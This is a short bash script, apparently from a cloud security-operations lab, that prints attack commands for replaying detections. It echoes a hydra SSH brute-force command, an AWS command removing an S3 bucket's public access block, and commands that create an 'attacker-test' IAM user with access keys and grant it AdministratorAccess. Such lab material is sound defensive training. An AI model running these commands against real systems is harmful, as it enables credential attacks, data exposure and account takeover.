#!/bin/bash

echo "[INFO] Cloud Mini-SOC attack replay helper"
echo "[INFO] Replace placeholder values before running commands manually."

echo ""
echo "A - SSH brute force:"
echo "hydra -l ubuntu -P pass.txt ssh://<victim_private_ip> -t 4"

echo ""
echo "B - S3 bucket public access modification:"
echo "aws s3api delete-public-access-block --bucket <victim_data_bucket>"

echo ""
echo "C - IAM access key creation:"
echo "aws iam create-user --user-name attacker-test"
echo "aws iam create-access-key --user-name attacker-test"

echo ""
echo "D - IAM privilege escalation:"
echo "aws iam attach-user-policy --user-name attacker-test --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
